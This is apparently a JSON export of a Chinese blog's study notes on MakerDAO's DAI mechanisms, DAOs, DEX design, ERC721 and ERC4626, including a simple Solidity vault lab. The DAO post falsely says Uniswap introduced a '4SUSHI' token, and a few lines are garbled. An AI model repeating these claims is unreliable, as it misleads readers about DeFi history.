{"posts":[{"title":"DAI","content":"DAI 是Maker Protocol的主要产品，Maker Protoco 是由Maker DAO来管理和维护的。\nDAI的供应量控制贷款利率： Stability fee\n存款利率： DAI Saving Rate(DSR)\n通过控制这两个利率，来控制供应量（类似于“升息降息”）\nDAI的收入来源是什么？\n\n\n收入来源\n简介\n是否主要收入来源\n\n\n\n稳定费\n用户铸造 DAI 时支付的利息\n✅ 是\n\n\n现实世界资产收益\n投资国债、协议贷款等带来的实际利息收入\n✅ 是\n\n\n清算惩罚收入\n抵押资产清算时收取的惩罚费用\n⚠️ 次要\n\n\n储蓄率利差\nDAI 储户收益与实际投资收益之间的利差\n⚠️ 次要\n\n\n🔰 一、什么是 Maker Buffer？Maker Buffer 是 MakerDAO 协议的“储备金账户”，是一个专门用来应对系统风险的资金缓冲池。\n资金来源：\n用户铸造 DAI 时支付的 Stability Fee（稳定费）\n用户抵押品被清算时的 Penalty Fee（清算罚金）\n投资资产的 利差收益（如 RWA 收益）中保留的一部分\n\n这些收入不会马上分发给 MKR 持有人，而是先进入 Maker Buffer，积累成“应急备用金”。\n\n二、Maker Buffer 的核心作用\n\n\n作用\n说明\n\n\n\n🩹 1. 弥补清算亏空\n当某笔抵押贷款在清算时 ETH 跌太狠，卖出的钱还不够还债时（比如差 500 DAI），Maker Buffer 会补上这笔缺口，防止系统坏账。\n\n\n💸 2. 作为 DSR 支付资金池\n给用户发放 DAI 储蓄利率（DAI Savings Rate, DSR）时，部分资金来自 Buffer。\n\n\n🏦 3. 支撑协议运营&#x2F;治理提案\n有时社区治理会决定拿一部分 Buffer 中的资金做协议开发、流动性激励等用途。\n\n\n\n三、风险与挑战\n\n\n风险点\n解释\n\n\n\n🧨 清算集中爆发\n如果市场剧烈下跌，大量抵押仓同时爆仓，Maker Buffer 可能被迅速耗尽。\n\n\n🪙 Buffer 不足时会铸 MKR 融资\n若 Buffer 钱不够，系统会启动“债务拍卖”，铸造新的 MKR 卖掉换 DAI 补窟窿，这会稀释 MKR 持有者利益。\n\n\n📉 收入减少时补偿能力下降\n如果稳定费和罚金收得少（比如没人清算、利率设得很低），Buffer 增长变慢，抗风险能力减弱。\n\n\n\n✅ 总结一句话：\nMaker Buffer 就像是 DAI 系统的安全垫和应急钱包，用来应对贷款清算亏损和支付协议运行成本，是保持 DAI 稳定和系统健康的关键一环。但一旦 Buffer 被耗尽，就可能触发更严重的机制，比如增发 MKR 来“救火”，从而影响整条链的稳定和投资者信心。\n案例分析假设1ETH&#x3D;2000 USD，质押了5个ETH 到Maker Vault，按照150%的超额抵押率，最多可以借出10000&#x2F;150%&#x3D;6666.67 个DAI。保险起见，用户借出5000 DAI，其余1666.67为缓冲区。\n情形1:ETH 涨价到 3000 USD。此时5ETH&#x3D;15000USD，基于150%的抵押率，用户最多可以借出10000 DAI.\n情形2:ETH跌到1500USD，此时5ETH&#x3D;7500USD,7500 USD&#x2F;5000 DAI&#x3D;150%。用户面临三个选择:1.往Maker Vault 质押更多的 ETH；（若不想被清算，就要提高抵押率）2.还回（所有）5000 DAl+Stability Fee,拿回5个 ETH; （损失利息）3.还回**部分 **DAl+Stability Fee，增加自己的缓冲区\nDAI的防护网之一 —— Colleteral Auction情形3:ETH 跌到1200 USD，此时5ETH&#x3D;6000 USD.触发清算，Keeper 介入清算流程;\n\n5个ETH 按照市价折扣3%进行拍卖，每次增加0.5%，直到拍卖成功;\n\nKeeper 使用 DAI 来竞拍，价高者得;\n\n扣除 5000 DAl+ Penalty Fee 等费用，其余 ETH 返回给用户;\n\nPenalty Fee惩罚费\n\n\n\n解释：你之前用 5 个 ETH 抵押，借了 5000 个 DAI。系统要求你要保持足够高的抵押率（比如 150%），但现在 ETH 跌到了 1200 美元&#x2F;个，所以：\n🚨 情况触发：抵押率不够，系统自动清算你\n\n步骤详解\n1️⃣ 系统把你的 5 个 ETH 拿去拍卖\n\n拍卖起始价打个 97 折（也就是 3% 折扣）吸引人参与；\n如果没人出价，**每次加价 0.5%**，直到有人愿意买；\n目的：快速把 ETH 卖掉，换回 DAI，偿还你的欠款。\n\n2️⃣ Keeper 是谁？他们做什么？\n\nKeeper 就是链上的“机器人”或者参与者；\n他们会用自己的 DAI 来参与竞拍 ETH，谁出价最高，谁就拿走 ETH；\n他们之所以愿意买，是因为 ETH 起拍价低，有套利空间。\n\n3️⃣ 清算后的处理方式：\n\n系统用拍卖得来的 DAI 先还你的 5000 DAI 债务；\n然后还要收你一笔 清算罚金（Penalty Fee），比如 13%；\n剩下的 ETH（如果有多余）会还给你；\n如果拍得价格高，那 ETH 卖得好，可能还有剩；\n如果拍得低，那你就亏了更多。\n\n\n\n\n✅ 举个具体数字例子：\n\n\n\n项目\n数值\n\n\n\n你抵押的 ETH\n5 个\n\n\n当前 ETH 价格\n$1200\n\n\n总价值\n$6000\n\n\n你欠的 DAI\n5000\n\n\n拍卖起始价\n5 ETH 按 $1164&#x2F;ETH（3% 折扣）开始\n\n\n\n如果 Keeper 拍到了 5 ETH，支付了 $6100 的 DAI，系统拿出其中：\n5000 DAI 用来还你的贷款，\n比如 650 DAI 作为罚金，\n剩下的那点（如 450 DAI 相当的 ETH）退还你。\n\n\n\n\n💡总结一句话：\nETH 跌了，你抵押不够了，系统强制清算你，拍卖掉你的 ETH，先还你的欠款和罚金，剩下的才还你，不一定有剩，你可能亏钱。\nDAI的防护网之二-Maker BufferStability Fee&#x2F;Penalty Fee等缓慢积攒;\n情形4: ETH 跌到 900 USD，此时5 ETH&#x3D;4500 USD，拍卖后的缺口为 500 USD;\n​\t\t\t从Maker Buffer 支付 500弥补缺口;\n解释：🛡 DAI 的防护网之二 —— Maker Buffer 是什么？\n想象一下 Maker 协议有个“小金库”，这个金库就叫 Maker Buffer。 它是通过系统运行时收取的 利息（Stability Fee） 和 清算罚金（Penalty Fee） 一点点积累起来的。\n就像你平时把赚的钱攒起来，留着应急用。\n\n🚨 情景 4：ETH 大跌，清算后还差钱怎么办？\n\n原本你用 5 个 ETH 抵押，借了 5000 个 DAI；\n现在 ETH 跌到 900 美元，所以你这 5 个 ETH 现在只值 4500 美元；\n系统拍卖 ETH 得到的钱不够还你的 5000 DAI 欠款，差了 500 DAI；\n\n💡那差的钱去哪补？\n\n系统就会从这个“Maker Buffer（金库）里掏出 500 DAI”来补上这个窟窿；\n保证整个系统不会因为你这一单亏损就破产。\n\n\n✅ 总结一句话：\nETH 跌太狠，你的抵押品卖了也不够还钱，Maker 会动用自己之前攒下的利息和罚金收入（Maker Buffer）来“垫付”这笔差额，确保系统健康运行、DAI 不出事。\nDAl 的防护网之三– Debt Auction情形5:ETH跌到 900USD，此时5ETH&#x3D;4500USD，拍卖后的缺口为500 USD，而Maker Buffer 里只有100 DAI，资金缺口为400 USD。\n\n增发 MKR 进行拍卖;\n用户使用 DAI参与拍卖，拍卖得到的 DAl来弥补缺口;\n一种对社区治理惩罚的方式;\n\n解释：\n这是 DAI 的第三道“防护网”，叫做 Debt Auction，意思是“债务拍卖”。\n假设你之前用 5 个 ETH 抵押借了 5000 DAI，但现在 ETH 跌到 900 美元，总共才值 4500 美元。 系统把你的 ETH 拍卖掉后，只换回了 4500 DAI，还有 500 DAI 的窟窿没补上。\n系统本来可以从 Maker Buffer（金库）里拿钱补，但现在里面只剩 100 DAI，还是不够，差 400 DAI。\n这时候，系统就会启动最后一招：增发 MKR（Maker 的治理代币）来卖钱。\n具体做法是： 系统“印”出一些新的 MKR，放到市场上进行拍卖； 用户用 DAI 去竞拍这些 MKR，谁出价高就能买到； 拍卖收到的 DAI 就被用来填补那 400 DAI 的缺口。\n这相当于社区治理的惩罚措施： 因为系统风险管理不到位、风险太高，所以最后要靠稀释 MKR 持有者的利益来“兜底”。\n换句话说，MKR 被增发了，老持有者手里的 MKR 相对贬值了，社区承担了代价。（通货膨胀了）\n\n总结一句话： 当拍卖抵押品的钱不够还债、金库又没钱时，系统就会增发 MKR 拍卖换钱来补窟窿，这种机制确保 DAI 不出问题，但会惩罚整个社区和 MKR 持有者。\nMakerDAO 的运行机制【一】提案阶段\n\n发起提案：任何 MKR 持有人都可以发起新提案；\n在 MakerDAO 社区进行公开讨论；\n提交优化后的正式提案；\nRisk Team（风险评估团队）对提案进行评估和建模分析。\n\n【二】投票阶段\n\n每一个 MKR 代币代表一票投票权，支持投票代理（Delegate）；\n投票期通常持续 7 天；\n最终根据投票结果决定提案是否通过（一般需超过 4% MKR 持有者同意）。\n\n\n","url":"2025/07/21/DAI/","date":"2025-07-21"},{"title":"DAO","content":"一、DAO 基础概念什么是 DAO（去中心化自治组织）定义：\n\nDecentralized：基于区块链，由利益相关者共同决策。\nAutonomous：运行逻辑由智能合约执行，在特定情况下无需人工干预。\nDAO 是一个自主存在于网络中的实体，由公开透明的代码编码组织规则，管理组织资产。\n\n特点：\n\n社区治理：以集体方式作出决策（某种方式为自己做决定）。\n资产管理：拥有和分配内部资产的能力（包含内部资产，且它有能力将该资产用于奖励某些活动）。\n\nDAO vs 传统公司\n\n\n特性\nDAO\n公司\n\n\n\n管理结构\n自下而上，去中心化\n自上而下，层级分明\n\n\n决策透明度\n公开透明\n相对封闭\n\n\n成员参与方式\n自主发起，自愿参与\n由雇佣关系或股份结构决定\n\n\n目标\n社区共识，长期共赢\n股东利润最大化\n\n\nDAO 的类别\nProtocol DAO：Uniswap、MakerDAO  \nSocial DAO：SeedClub、FWB  \nVenture DAO：CultDAO  \nMedia DAO：Bankless DAO  \nGrant DAO：Gitcoin\n\n\ndao究竟在做什么（1）去中心化资产管理\n案例：ConstitutionDAO 众筹资金竞拍美国宪法副本，BitDAO 管理数十亿美元加密资产。\n方式：集体决定资金用途（投资、捐赠等），避免个人操控。\n\n（2）协议&#x2F;项目治理\n案例：Uniswap、Aave 等DeFi协议由DAO决定手续费、上新资产等规则。\n方式：代币持有者投票升级智能合约或调整参数。\n\n（3）社区协作与创作\n案例：PleasrDAO 收藏数字艺术并资助创作者，BanklessDAO 推动加密教育。\n方式：成员提案并投票分配资源，激励内容生产或开发。\n\n（4）投资与孵化\n案例：MetaCartel Ventures 投资早期Web3项目，收益返还成员。\n方式：DAO作为风投基金，集体决策投资项目。\n\n（5）社会实验与公益\n案例：Gitcoin DAO 资助开源开发，UkraineDAO 募集战争援助资金。\n方式：透明化资金流向，社区监督执行。\n\n二、DAO 的构建与实践如何做一个 DAO？\n明确目标和社区共识\n选择合适的治理模型\n配置 DAO 工具（见下方工具章节）\n启动并运作：提案 → 投票 → 执行\n\nDAO 的优势\n去信任（Trustless）\n自下而上的创新\n利益相关者即用户（User &#x3D; Owner）\n网络效应驱动\n共建共识，打造品牌\n\nDAO 面临的效率问题及解决方案问题：\n\n基础设施不完善\n仍存在中心化现象\n缺乏治理模型标准\n\n解决办法：\n\n引入 DAO 工具\n适度中心化（局部中心化）\n权益分离\n治理模型结合：直接民主 + 代议制民主\n\n\n三、DAO 治理实践治理流程要点\n任务发布：提升社区参与效率\n贡献记录：如使用 Proof-of-Work（非挖矿）方式记录贡献\n提案与投票制度设计：\n谁可以提案\n谁可以投票\n票数达标机制（需要预设基础：大于百分之多少的票，结果才是有效的（或者多次投票）\n\n\n激励机制：\n不可交易积分系统\n按工作时间 * 工作难度评分\n\n\n\n\n\n\n四、DAO 工具生态社区治理类\nSnapshot：查看&#x2F;管理治理提案及投票情况，支持自定义逻辑。\nTally：链上投票与提案执行平台。\n\n国库管理与多签\nSafe（多签钱包）：资产管理，需多方签名确认操作。\n操作流程：\n创建多签\n注入资产\n发起并签署操作\n\n\n\n薪酬与奖励系统\n\n\n工具名称\n功能说明\n\n\n\nUtopia\n空投、报销\n\n\nParcel\n批量支付\n\n\nSuperfluid\n实时流式支付\n\n\nDework\n赏金平台，任务驱动贡献\n\n\nDao关于社区治理的工具\nSnapshot\n\n作用：1.直接在snapshot对应的DAO去治理提案&#x2F;投票情况查看\n​\t\t\t2.可以用代码编写自己的逻辑\n\nTally\n\nDao关于国库管理的工具(用于激励和社区活动)\n多签类\nSafe\n\n(用法：在社区投票讨论通过后，由有多签权限的人发起多签 然后进行以下几种做法)\n创建多签\n注入资产\n发起多签\n签名\n薪酬支付类\nUtopia(支持空投 报销）\n\nParcel(批量支付）\n\nSuperfluid(流支付）\n\nDework(赏金平台）\n\n\n国库管理类（根据贡献自动分发Token）\n定义并铸造代币\n确定分发规则\n贡献者进行工作\n自动获得奖励\n\n可发起捐赠融资 \n\n质押\n\n策展传播\n\n\n举例：Nutbox\nDAO操作系统一．\nAragon\n\nColony\n\nDAOHaus\n\n\nMetaCartel Ventures\n二. Nouns.build 之 Nouns DAO创新点：有流行性创意性，丰富。\n其他工具—任务平台\n\n\n类型\n工具\n说明\n\n\n\n教育&#x2F;任务\nRabbitHole\n学习与任务完成\n\n\n数据分析\nDeepDAO\nDAO 分析平台\n\n\n众筹&#x2F;NFT\nPartyBid\n联合竞拍平台\n\n\n贡献评估\nCoordinape、Sourcecred\n同行评估、声誉评分\n\n\n\n工具众多，强调「可组合性」，可类似 WordPress 配置插件组合使用。\n\n\n五、DAO 实践案例The DAO\n第一个真正意义上的去中心化自治组织。\n\nUniswap DAO\n初期手续费（0.3%）全部归 LP 所有。\n后期引入治理代币 UNI\nUniswap确实引入了4SUSHI代币，将部分手续费分配给代币持有者。\nUNI代币赋予持有者治理权限，包括提案和投票。\n\nPS：\n治理代币的设计通常旨在确保治理权力掌握在积极参与的社区成员手中，直接转让可能会削弱治理的稳定性和参与度。\n许多DAO采用多代币模型或不同的机制来区分治理和激励功能。\nDAO通常注重长期价值和社区参与\n\n\n六、加入 DAO 的路径如何选择 DAO？\nDAO 阶段是否适合你的参与水平\n回答两个问题：\n团队是否有能力做成事情？\n如果做成了，能否公平分配收益？\n\n\n考察指标：\n团队调性、愿景、执行力\n社区氛围（vibe）\n经济模型、价值捕获能力\n\n\n\n加密原生路径建议\n加入早期 DAO&#x2F;公链生态\n使用和贡献开源工具\n强调精简和产品市场匹配\n\n\n七、Web3 与投资思维Web3 思维框架\n所有权逻辑：\nWeb2：所有权集中 → 股东为核心\nWeb3：使用即所有 → 利益相关者为核心\n\n\n共赢网络：\n鼓励用户&#x2F;开发者共同建设与享有收益\n\n\n\n\n八、项目研判逻辑\n一、赛道判断\n是否解决关键问题（速度、安全、成本、隐私）\n市场是否足够大\n技术是否在投资周期内可成熟\n\n二、项目价值判断（1&#x2F;2）定性分析：\n商业逻辑是否闭环\n业务模式是否合理\n团队背景与叙事独特性\n核心竞争力是否可持续\n\n定量分析：\n链上数据是否活跃\n社区热度\n相对估值（如 FDV&#x2F;TVL）\n绝对估值（收入、利润、DCF）\n\n三、项目风险分析（2&#x2F;2）不足：\n用户定位模糊\n技术不先进\n竞争激烈\n\n退出机制：\n原投资逻辑失效\n已实现收益目标\n存在更优投资标的\n\n\n\n备注：部分 DAO 创始人保留一票否决权以保护社区和治理秩序。\n\n补充回溯性空投：创造收益\n如何 Crypto Native?(参见Twitter:CryptoNiels27)\n","url":"2025/04/12/DAO/","date":"2025-04-12"},{"title":"DEX详解","content":"交易所的盈利来源\n以币安为例\n\n\n交易费:交易所通过提供买卖加密货币的平台来收取交易费用有些交易所还提供高级交易选项，如杠杆交易，这通常会带来更高的费用;\n上币费:项目方团队后面都会去找交易所上币，然而上币需要缴纳一笔数额不小的上币费\n量化交易：用户在交易所中，一般数字资产币都是暂时存放在交易所，基本上交易所掌握所有筹码可以选择做多或者做空易所，所可以去赚取差价，i而用户提币出去也能赚取手续费\n原生代币;\n\n中心化交易所的交易模式–订单簿模式\n中央限价订单簿(CLOB)就是一本由出价和报价组成的权限透明账本，从最好价开始依次排序(两边分别是参与者愿意买&#x2F;卖的价格)。\n所有的参与者都能看到所有的报价和出价，他们也可以参与其中。\n订单簿中两边的第一行，即是最好的报价&#x2F;出价。\n\n订单簿模式的优劣优势:\n\n透明的流动性劣势\n做市商可自由出入\n做市商可以自由决定价格与数量\n\n劣势：\n\n冷启动问题(很难给出初始流动性)\n对非流动性资产不利\n如果是链上交易所，则对链的TPS 的要求很高、\n\nTPS 是 Transactions Per Second（每秒交易数）的缩写，用于衡量一个区块链网络在单位时间内能够处理交易的速度。它是评估区块链性能（尤其是交易所等高频场景）的关键指标之一。\n\n为什么链上交易所对TPS要求很高？\n实时交易需求交易所需要快速处理大量用户的买卖订单，低TPS会导致交易延迟、拥堵，用户体验变差（例如牛市时以太坊网络拥堵、Gas费飙升）。\n避免交易积压如果TPS过低，未确认的交易会堆积在内存池（mempool）中，可能导致交易失败或需要支付更高手续费来优先处理。\n竞争性场景高频交易、套利等操作依赖快速确认，高TPS能减少价格滑点和市场波动带来的风险。\n\n\n不同区块链的TPS对比\n比特币：约 3-7 TPS（设计初衷侧重去中心化和安全性，牺牲速度）。\n以太坊：约 15-30 TPS（主网），Layer 2扩容后可达数千TPS。\nSolana：宣称 2,000-65,000 TPS（通过高吞吐量设计）。\nBSC（币安智能链）：约 100-300 TPS。\n\n\n提高TPS的常见方案\nLayer 1优化\n扩大区块容量（如比特币的区块扩容争议）。\n改进共识机制（如从PoW转向PoS，以太坊2.0）。\n\n\nLayer 2扩容\n链下处理交易，批量结算（如Rollups、z状态通道）。\n\n\n分片技术（Sharding）\n将网络分成多个并行处理的碎片，提升并行处理能力（以太坊2.0的目标）。\n\n\n\n、\n链上交易方案:自动做市商\n出现原因:以太坊的 TPS 对于支撑链上订单簿的实时更新来说太低了。反面案例:Solana链由于其60K的TPS，其上有许多订单簿模式的交易所。\n交易所里没有订单簿，只有一系列预设的函数，为各类货币的互相交换来定价。\n这些预设的函数(例如 x*y&#x3D;k)基于两头货币在各自流动性池中的供给变化率，来设定价格。在某个货币的流动性池内，任何人都能够提供该种货币以增加其流动性，从而获得收益。\n\n","url":"2025/07/31/DEX详解/","date":"2025-07-31"},{"title":"ERC721","content":"12import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;\n\n\n\n定义非同质化代币（也称为契约）的标准接口。\n每个符合 ERC-721 的合约都必须实现ERC721和ERC165接口\n\n它更大的想象空间在于将物理世界的资产映射到区块链上。\n\n谜恋猫是第一个实现了ERC721 标准的去中心化应用\n\nERC20代币是可置换的，且可细分为N份（1 &#x3D; 10 * 0.1）, 而ERC721的Token最小的单位为1，无法再分割。\n\n\n\n如果同一个集合的两个物品具有不同的特征，这两个物品是非同质的，而同质是某个部分或数量可以被另一个同等部分或数量所代替。\n\n钱包接口123456789101112131415/// @dev Note: the ERC-165 identifier for this interface is 0x150b7a02.interface ERC721TokenReceiver &#123;    /// @notice Handle the receipt of an NFT    /// @dev The ERC721 smart contract calls this function on the recipient    ///  after a `transfer`. This function MAY throw to revert and reject the    ///  transfer. Return of other than the magic value MUST result in the    ///  transaction being reverted.    ///  Note: the contract address is always the message sender.    /// @param _operator The address which called `safeTransferFrom` function    /// @param _from The address which previously owned the token    /// @param _tokenId The NFT identifier which is being transferred    /// @param _data Additional data with no specified format    /// @return `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`    ///  unless throwing    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);\n\n\n\n参考：https://learnblockchain.cn/article/33\n实战基于OpenZeppelin的ERC721智能合约MyERC721Token\n参考https://learnblockchain.cn/article/14779\n","url":"2025/06/07/ERC721/","date":"2025-06-07"},{"title":"ERC4626详解","content":"VaultVault（保险库） 通常指一种资金管理和收益策略工具，主要用于 DeFi（去中心化金融）协议中，用来帮助用户自动化收益最大化，降低操作难度和 Gas 成本。\nVault 的主要功能\n自动复投 Vault 会将挖矿奖励、利息等收益，自动复投到原策略中，提升复利效应，用户不需要手动操作。\n策略自动化 比如 Yearn Finance 的 Vault，会根据链上数据动态调整策略，将资金投向收益更高的 DeFi 协议。\n降低 Gas 成本 单个用户频繁操作会耗费大量 Gas，而 Vault 将资金集中，批量执行操作，摊薄 Gas 成本。\n风险隔离 不同策略可以部署在不同的 Vault 中，用户可以根据风险偏好选择。\nyield farming&#x2F;借贷&#x2F;质押\n\n\nYield Farming（收益耕作） 是 DeFi（去中心化金融） 中的一种策略，指用户将自己的加密资产存入特定协议（如借贷、流动性池、收益聚合器）中，以赚取额外收益（通常是利息或平台代币奖励）的行为。\n简单来说，Yield Farming 就是“把加密货币拿去生钱”，类似于传统金融里的“存款生息 + 活期理财”，但更复杂、收益更高、风险也更大。\n\n\n典型项目✅ Yearn Finance 最经典的 Vault 应用，用户存入稳定币、ETH 或 LP Token，Vault 会自动将资金部署到 Curve、Compound 等平台，执行收益优化策略。\n✅ Beefy Finance 多链收益聚合器，Vault 帮助用户将流动性挖矿奖励复投，提升收益。\n\n简单理解如果把 DeFi 理解为“数字银行”，那么 Vault &#x3D; 自动理财管家：\n\n你把钱交给 Vault（智能合约）\n它帮你找高收益、做复投\n省去手动搬砖的麻烦\n\nLP TokenLP Token（Liquidity Provider Token，流动性提供者代币） 是 用户向去中心化交易所（DEX）或流动性池提供流动性后获得的凭证代币，它代表着用户在池子中所占的份额。\n\n LP Token &#x3D; 你在流动性池的股份证明，可以提币、分红、甚至去挖矿。\n\n\n为什么会有 LP Token？在 Uniswap、SushiSwap、Curve 等 AMM（自动做市商）模型的 DEX 中，交易对（如 ETH&#x2F;USDC）需要资金池提供流动性。 当你往池子里存入等价值的两种资产（例如 1 ETH + 2000 USDC），你就成为了 流动性提供者（Liquidity Provider, LP）。 为了证明你存入了多少，系统会给你发一个 LP Token，这就是你的 股份凭证。\n\nLP Token 的作用\n提现凭证\n以后你要从池子里取出资金，必须用 LP Token 去兑换你的资产（本金 + 交易手续费分红）。\n\n\n收益分配\n交易产生的手续费会按 LP Token 占比分给 LP 持有人。\n\n\n参与 DeFi 挖矿（Liquidity Mining）\n你可以拿 LP Token 去 质押（Stake），获取额外奖励（比如治理代币）。\n\n\n\n\n举例\n你往 Uniswap 的 ETH&#x2F;USDC 池子存了 1 ETH + 2000 USDC\n系统给你 10 个 LP Token\n池子总价值是 100 ETH + 200,000 USDC（假设 LP Token 总量 1000）\n你的 LP Token 占比 &#x3D; 10 &#x2F; 1000 &#x3D; 1%\n所以，你拥有池子中 1% 的资金份额和手续费收益。\n\n\n风险\n无常损失（Impermanent Loss）：如果 ETH 价格大涨或大跌，你最终取出的资产组合可能少于单纯持币的价值。\n合约风险：LP Token 本身是由智能合约发行，如果合约被攻击，你可能损失资金。\n代币贬值：如果奖励代币暴跌，实际收益降低。\n\nVault01实验目的实现一个基础的Vault合约，并结合ERC20代币，完成用户的充值（deposit）和取款（withdraw）逻辑。\n准备1. USDT合约合约路径：ERC20_fortest.sol 功能描述： 该合约基于 OpenZeppelin 提供的 ERC20 标准，实现了一个名为 Tether USD（USDT） 的代币，主要用于模拟稳定币的发行。\n代码12345678910// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;contract USDT is ERC20 &#123;    constructor(uint256 initialSupply) ERC20(&quot;Tether USD&quot;, &quot;USDT&quot;) &#123;        _mint(msg.sender, initialSupply);    &#125;&#125;\n\n功能特点：\n\n使用 OpenZeppelin ERC20 标准库，安全且兼容性强。\n构造函数中通过 _mint() 为部署者铸造初始代币。\n\n2. Vault01合约合约路径：Vault01.sol 功能描述： 该合约实现一个资金池（Vault），用户可以存入 ERC20 代币并获得对应的 shares，shares 代表用户在池中的份额。用户可通过 shares 按比例赎回对应的代币。\n核心逻辑\n存款（deposit）： 用户将代币转入合约地址，并按规则获得对应份额（shares）。\n\n123456789/*          a = amount          B = balance of token before deposit          T = share total supply          s = shares to mint          (T + s) / T = (a + B) / B                s = aT / B          */ \n\n\n\n\n取款（withdraw）：\n\n12345678910/*          a = amount          B = balance of token before deposit          T = share total supply          s = shares to redeem          &amp;nbsp;        &amp;nbsp;        (T - s) / T = (B - a) / B         &amp;nbsp;        a = sB / T   &amp;nbsp;        */\n\n\n\n核心代码1234567891011121314151617181920212223242526272829303132333435363738394041// SPDX-License-Identifier: MITpragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC20.sol&quot;;contract Vault01 &#123;    IERC20 public immutable token;    uint256 public totalSupply;    mapping(address =&gt; uint256) public balanceOf;    constructor(address _token) &#123;        token = IERC20(_token);    &#125;    function __mint(address _to, uint256 _shares) private &#123;        totalSupply += _shares;        balanceOf[_to] += _shares;    &#125;    function __burn(address _from, uint256 _shares) private &#123;        totalSupply -= _shares;        balanceOf[_from] -= _shares;    &#125;    function deposit(uint256 _amount) external &#123;        uint256 shares;        if (totalSupply == 0) &#123;            shares = _amount;        &#125; else &#123;            shares = (_amount * totalSupply) / token.balanceOf(address(this));        &#125;        __mint(msg.sender, shares);        token.transferFrom(msg.sender, address(this), _amount);    &#125;    function withdraw(uint256 _shares) external &#123;        uint256 amount = (_shares * token.balanceOf(address(this))) / totalSupply;        __burn(msg.sender, _shares);        token.transfer(msg.sender, amount);    &#125;&#125;\n\n\n实验步骤\n部署 USDT 合约\n\n在 Remix 中部署 ERC20_fortest.sol，初始发行 1000000 * 10^18 个代币。\n记录 USDT 合约地址，例如 0xABC...123。\n\n\n部署 Vault01 合约\n\n构造函数传入 USDT 合约地址 0xABC...123。\nVault01 合约部署完成，等待交互。\n\n\n授权 Vault01 合约转账\n\n在 USDT 合约中执行 approve(vaultAddress, amount)。\n授权 Vault 可转账指定数量的 USDT。\n\n\n测试存款\n\n调用 deposit(100e18)。\n验证：\nVault01.balanceOf(msg.sender) 是否增加。\nVault01.totalSupply 是否更新。\nVault01.token.balanceOf(address(Vault01)) 是否为 100 USDT。\n\n\n\n\n测试取款\n\n调用 withdraw(50e18)。\n验证：\n用户账户 USDT 余额恢复。\nVault01.totalSupply 减少。\n\n\n\n\n\nERC4626阅读assets &amp; shares1234567891011121314151617// ERC4626 资产与份额接口// 资产信息查询/// @dev 返回金库的基础资产代币地址function asset() external view returns (address assetTokenAddress);/// @dev 返回金库管理的基础代币总额function totalAssets() external view returns (uint256 totalManagedAssets);// 数量转换/// @dev 将资产数量转换为份额数量//计算一个币可以转化成多少sharesfunction convertToShares(uint256 assets) external view returns (uint256 shares);/// @dev 将份额数量转换为资产数量function convertToAssets(uint256 shares) external view returns (uint256 assets);\n\n包含两个核心功能组：\n\n资产信息查询（asset 和 totalAssets）\n资产与份额的相互转换（convertToShares 和 convertToAssets）\n\n存款&#x2F;铸造相关函数接口12345678910111213141516171819202122// ERC4626 存款与铸造接口// 最大可存款/铸造量查询/// @dev 获取接收者可存入的最大资产数量function maxDeposit(address receiver) external view returns (uint256 maxAssets);/// @dev 获取接收者可铸造的最大份额数量function maxMint(address receiver) external view returns (uint256 maxShares);// 存款/铸造预览/// @dev 预览存入指定资产数量将获得的份额数量function previewDeposit(uint256 assets) external view returns (uint256 shares);/// @dev 预览铸造指定份额数量需要的资产数量function previewMint(uint256 shares) external view returns (uint256 assets);// 存款/铸造操作/// @dev 存入资产并给接收者铸造份额function deposit(uint256 assets, address receiver) external returns (uint256 shares);/// @dev 铸造份额并扣除接收者的资产function mint(uint256 shares, address receiver) external returns (uint256 assets);\n\nreceiver的作用是什么？receiver 参数的作用是 指定存款&#x2F;铸造操作中接收份额（shares）的目标地址。它的设计目的是实现更灵活的资产托管和委托操作。\n\n相当于充值给另外一个地址\n\n与 msg.sender 的区别\n\nmsg.sender代表实际调用合约的地址（操作者），通常是支付资产（transferFrom）的地址。\nreceiver代表最终获得份额的地址，可能与 msg.sender 相同，也可能不同。\n\n提款与赎回接口123456789101112131415161718192021222324252627282930// ERC4626 提款与赎回接口// ========== 最大可提款/赎回量查询 ==========/// @dev 获取所有者可提取的最大资产数量（基于其份额）function maxWithdraw(address owner) external view returns (uint256 maxAssets);/// @dev 获取所有者可赎回的最大份额数量function maxRedeem(address owner) external view returns (uint256 maxShares);// ========== 提款/赎回预览计算 ==========/// @dev 预览提取指定资产数量需要销毁的份额数量function previewWithdraw(uint256 assets) external view returns (uint256 shares);/// @dev 预览赎回指定份额数量将获得的资产数量function previewRedeem(uint256 shares) external view returns (uint256 assets);// ========== 提款/赎回操作 ==========/// @dev 提取资产（销毁所有者的份额，资产发送给接收者）function withdraw(    uint256 assets,    address receiver,    address owner) external returns (uint256 shares);/// @dev 赎回份额（销毁所有者的份额，资产发送给接收者）function redeem(    uint256 shares,    address receiver,    address owner) external returns (uint256 assets);\n\n核心区别：withdraw vs redeem\nwithdraw\n用户指定想要提取的资产数量（assets）。\n系统自动计算需要销毁的份额（shares），通过 previewWithdraw 预览。\n适用场景：用户关注能拿到多少底层资产（如“我要提100 USDC”）。\n\n\nredeem\n用户指定要销毁的份额数量（shares）。\n系统计算可获得的资产数量（assets），通过 previewRedeem 预览。\n适用场景：用户关注销毁多少份额（如“我要赎回50 vaultShares”）。\n\n\n\n为什么需要 owner 和 receiver？\nowner\n代表实际持有份额的地址（必须已授权调用者操作其份额）。\n例如：智能合约代理可替用户操作，但份额属于用户地址。\n\n\nreceiver\n允许将提取的资产发送到第三方地址（如归集钱包或另一个合约）。\n例如：用户可指定将资产直接发送到交易所地址。\n\n\n\n总体：\n两个事件123456789101112131415161718// ERC4626 存款/提款事件/// @dev 当存入资产并铸造份额时触发event Deposit(    address indexed sender,    // 操作者地址（调用合约的地址）    address indexed owner,     // 份额所有者地址    uint256 assets,            // 存入的资产数量    uint256 shares             // 铸造的份额数量);/// @dev 当提取资产并销毁份额时触发event Withdraw(    address indexed sender,    // 操作者地址（调用合约的地址）    address indexed receiver,  // 资产接收者地址    address indexed owner,     // 份额所有者地址    uint256 assets,            // 提取的资产数量    uint256 shares             // 销毁的份额数量);\n\n\n\n在 withdraw 操作中，如果 msg.sender !&#x3D;owner那么 msg.sender 需要先请 owner 